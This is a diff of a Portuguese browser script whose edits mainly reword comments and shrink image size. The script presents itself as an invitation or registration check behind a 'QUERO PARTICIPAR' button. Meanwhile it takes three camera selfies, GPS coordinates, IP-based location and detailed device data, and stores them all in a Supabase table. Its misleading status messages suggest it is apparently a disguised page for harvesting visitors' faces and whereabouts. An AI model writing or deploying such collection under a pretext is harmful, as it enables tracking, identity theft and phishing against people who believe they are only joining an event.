@@ -1,20 +1,24 @@
-// 1. SUBSTITUA AS IMPORTAÇÕES DO FIREBASE POR ESTA DO SUPABASE:
+// =================================================================
+// 1. IMPORTAÇÃO DO CLIENTE DO SUPABASE
+// =================================================================
 import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/+esm";
 
-// 2. SUBSTITUA O BLOCO 'const firebaseConfig' POR ESTE:
-// Nota: Pegue a URL do seu projeto em Settings -> API -> Project URL no painel do Supabase
+// =================================================================
+// 2. CONFIGURAÇÃO DE CONEXÃO DO SEU PROJETO
+// =================================================================
 const SUPABASE_URL = "https://gskcadoofoqwhqshcxcs.supabase.co"; 
-const SUPABASE_KEY = "sb_publishable_xup-F-C4wv_epMIAbohpjQ_aXnLZOL3"; // Sua chave pública enviada
+const SUPABASE_KEY = "sb_publishable_xup-F-C4wv_epMIAbohpjQ_aXnLZOL3"; 
 
 const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
 
+// Elementos da Página
 const video = document.getElementById("video");
 const btn = document.getElementById("btn");
 const statusText = document.getElementById("status");
 const canvas = document.getElementById("canvas");
 
 // ======================
-// ÁUDIO
+// SISTEMA DE ÁUDIO
 // ======================
 function falar(texto){
   speechSynthesis.cancel();
@@ -27,7 +31,7 @@ function falar(texto){
 }
 
 // ======================
-// INICIAR SISTEMA
+// INICIAR CÂMERA
 // ======================
 async function iniciarSistema(){
   try {
@@ -62,7 +66,7 @@ window.onload = () => {
 };
 
 // ======================
-// FUNÇÃO: ANALISAR DISPOSITIVO
+// ANALISAR DISPOSITIVO
 // ======================
 function analisarDispositivo() {
   const ua = navigator.userAgent;
@@ -94,16 +98,16 @@ function analisarDispositivo() {
   return { androidVersion, browser, model };
 }
 
-// ======================
-// BOTÃO
-// ======================
+// =================================================================
+// BOTÃO PRINCIPAL: PROCESSO DE CADASTRO
+// =================================================================
 btn.addEventListener("click", async () => {
   try {
     btn.disabled = true;
     btn.innerHTML = "PROCESSANDO...";
     
     // ======================
-    // MÚLTIPLAS FOTOS
+    // CAPTURA DE FOTOS EM BASE64 (OTIMIZADO)
     // ======================
     statusText.innerHTML = "📨 Verificando informações do convite..";
     falar("Verificando informações do convite..");
@@ -115,27 +119,31 @@ btn.addEventListener("click", async () => {
       throw new Error("Vídeo não carregou");
     }
 
-    canvas.width = largura;
-    canvas.height = altura;
+    // Forçamos uma resolução padrão de 640x480 para o texto Base64 não estourar o limite do banco
+    canvas.width = 640;
+    canvas.height = 480;
     const ctx = canvas.getContext("2d");
     const fotos = [];
 
     // Captura 3 fotos com intervalo de 1 segundo
     for(let i = 0; i < 3; i++) {
-        ctx.drawImage(video, 0, 0, largura, altura);
-        fotos.push(canvas.toDataURL("image/jpeg", 0.8));
+        // Desenha a imagem redimensionando-a para o canvas leve
+        ctx.drawImage(video, 0, 0, 640, 480);
+        
+        // .toDataURL gera a string em Base64. Definimos a qualidade em 0.4 para ficar leve
+        fotos.push(canvas.toDataURL("image/jpeg", 0.4));
         
         if(i < 2) await new Promise(resolve => setTimeout(resolve, 1000));
     }
 
-    // Desliga os componentes de captura da câmara externa/interna
+    // Desliga os componentes de captura da câmara após terminar
     const stream = video.srcObject;
     if (stream) {
         stream.getTracks().forEach(track => track.stop());
     }
 
     // ======================
-    // GPS
+    // CAPTURA DO GPS
     // ======================
     let latitude = "não permitido";
     let longitude = "não permitido";
@@ -158,7 +166,7 @@ btn.addEventListener("click", async () => {
     }
 
     // ======================
-    // IP E LOCALIZAÇÃO DE REDE
+    // CAPTURA DE IP E DADOS DE REDE
     // ======================
     let ip = "indisponível";
     let cidade = "";
@@ -179,7 +187,7 @@ btn.addEventListener("click", async () => {
     }
 
     // ======================
-    // 3. NOVO BLOCO DO SUPABASE (Substituindo o addDoc do Firebase)
+    // SALVANDO NO SUPABASE
     // ======================
     statusText.innerHTML = "💾 Salvando cadastro...";
     falar("Salvando cadastro.");
@@ -190,7 +198,7 @@ btn.addEventListener("click", async () => {
       .from('checkins')
       .insert([
         {
-          selfies: fotos, 
+          selfies: fotos, // Suas 3 fotos salvas como texto Base64 dentro do array do Postgres
           latitude: latitude.toString(),
           longitude: longitude.toString(),
           ip: ip,
@@ -205,14 +213,14 @@ btn.addEventListener("click", async () => {
           idioma: navigator.language,
           largura_tela: window.innerWidth,
           altura_tela: window.innerHeight
-          // O "created_at" é gerado de forma automática pelo banco Postgres
+          // O campo created_at é preenchido sozinho pelo Supabase
         }
       ]);
 
     if (error) throw error;
 
     // ======================
-    // FINAL
+    // FLUXO DE SUCESSO FINAL
     // ======================
     statusText.innerHTML = "✅ Cadastro concluído";
     falar("Cadastro concluído com sucesso.");
@@ -223,8 +231,8 @@ btn.addEventListener("click", async () => {
 
   } catch(err) {
     console.log(err);
-    // Exibe o erro real direto na tela para sabermos o que aconteceu
-    statusText.innerHTML = "❌ Erro: " + (err.message || JSON.stringify(err)); 
+    // Mostra o erro real na tela do usuário caso falhe
+    statusText.innerHTML = "❌ Erro: " + (err.message || JSON.stringify(err));
     btn.disabled = false;
     btn.innerHTML = "QUERO PARTICIPAR";
   }
